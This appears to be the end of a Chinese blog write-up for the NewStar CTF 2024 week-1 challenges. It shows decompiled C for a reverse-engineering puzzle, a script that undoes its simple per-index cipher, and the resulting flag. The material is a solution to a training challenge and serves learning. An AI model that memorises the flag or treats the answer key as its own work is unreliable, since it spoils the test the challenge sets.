+<p>丢到 IDA 里，找到关键函数(如何找呢？主要是看字符串，诸如&quot;Enter the flag&quot;“Right”“success”&quot;wrong&quot;等词语，基本就是关键函数了)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="comment">//要求输入len个字符，点进去看到len是30</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;input[i]);</span><br><span class="line">  <span class="comment">//下面开始对输入进行处理</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//如果索引是3的倍数就减31</span></span><br><span class="line">    <span class="keyword">if</span> ( !(j % <span class="number">3</span>) )</span><br><span class="line">      input[j] -= <span class="number">31</span>;</span><br><span class="line">    <span class="comment">//如果索引除3还余1时就加41</span></span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">      input[j] += <span class="number">41</span>;</span><br><span class="line">    <span class="comment">//如果索引除3还余2时就与0x55异或</span></span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">      input[j] ^= <span class="number">0x55u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%02x &quot;</span>, input[k]);</span><br><span class="line">    <span class="comment">//输入值与buffer[]比较</span></span><br><span class="line">    <span class="keyword">if</span> ( input[k] != buffer[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以只需要将 buffer 数组逆向处理就可以得到 flag，buffer 可以在 ida 中查看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是官方c语言脚本</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[]=&#123;<span class="number">0x47</span>,<span class="number">0x95</span>,<span class="number">0x34</span>,<span class="number">0x48</span>,<span class="number">0xa4</span>,<span class="number">0x1c</span>,<span class="number">0x35</span>,<span class="number">0x88</span>,<span class="number">0x64</span>,<span class="number">0x16</span>,<span class="number">0x88</span>,<span class="number">0x07</span>,<span class="number">0x14</span>,<span class="number">0x6a</span>,<span class="number">0x39</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0x0a</span>,<span class="number">0x37</span>,<span class="number">0x5c</span>,<span class="number">0x07</span>,<span class="number">0x5a</span>,<span class="number">0x56</span>,<span class="number">0x60</span>,<span class="number">0x12</span>,<span class="number">0x76</span>,<span class="number">0x25</span>,<span class="number">0x12</span>,<span class="number">0x8e</span>,<span class="number">0x28</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">30</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            buffer[i]+=<span class="number">0x1f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            buffer[i]-=<span class="number">0x29</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">2</span>)&#123;</span><br><span class="line">            buffer[i]^=<span class="number">0x55</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;IT_15_R3Al1y_V3Ry-51Mp1e&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="ez-debug">* ez_debug</h4>
+<p><a target="_blank" rel="noopener" href="https://ns.openctf.net/wp/2024/week1/reverse/ez-debug.html">ez_debug | WriteUp - NewStar CTF 2024 (openctf.net)</a></p>
+<p><s>这个题标准是用动调，但是 ai 给我分析一通写了个脚本就完事了，所以这个题只提供官方 wp</s></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">链接</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">NewStar CTF 2024 校内赛道 week1 wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1"><span class="toc-number">1.1.</span> <span class="toc-text">week 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WhereIsFlag"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">WhereIsFlag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Labyrinth"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Labyrinth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decompress"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">decompress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pleasingMusic"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">pleasingMusic</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#headache3"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">headache3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E6%A2%B0%E5%8D%B1%E6%9C%BA"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">智械危机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">会赢吗</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#flag1"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag2"><span class="toc-number">1.1.2.3.2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag3"><span class="toc-number">1.1.2.3.3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag4"><span class="toc-number">1.1.2.3.4.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#end"><span class="toc-number">1.1.2.3.5.</span> <span class="toc-text">end</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">谢谢皮蛋</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.2.4.1.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%BD%A2%E5%BC%8F"><span class="toc-number">1.1.2.4.2.</span> <span class="toc-text">闭合形式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%8F%AF%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%B1%9E%E6%80%A7%E5%88%97%E6%95%B0"><span class="toc-number">1.1.2.4.3.</span> <span class="toc-text">判断可查询的属性列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.1.2.4.4.</span> <span class="toc-text">判断回显位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.4.5.</span> <span class="toc-text">查看当前页面数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.2.4.6.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">1.1.2.4.7.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.2.4.8.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6-1"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">* PangBai 过家家(1)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BA%8F%E7%AB%A0"><span class="toc-number">1.1.2.5.1.</span> <span class="toc-text">序章</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.1.2.5.2.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.1.2.5.3.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.1.2.5.4.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3-%E2%86%92end"><span class="toc-number">1.1.2.5.5.</span> <span class="toc-text">第四关 →end</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">1.1.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#begin"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">begin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezAndroidStudy"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">ezAndroidStudy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-encryption"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">Simple_encryption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-debug"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">* ez_debug</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.gubaiovo.com/posts/9825a8eb.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.gubaiovo.com/posts/9825a8eb.html&text=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.gubaiovo.com/posts/9825a8eb.html&is_video=false&description=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar CTF 2024 校内赛道 week1 wp&body=Check out this article: https://www.gubaiovo.com/posts/9825a8eb.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.gubaiovo.com/posts/9825a8eb.html&name=NewStar CTF 2024 校内赛道 week1 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.gubaiovo.com/posts/9825a8eb.html&t=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    gubai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">链接</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
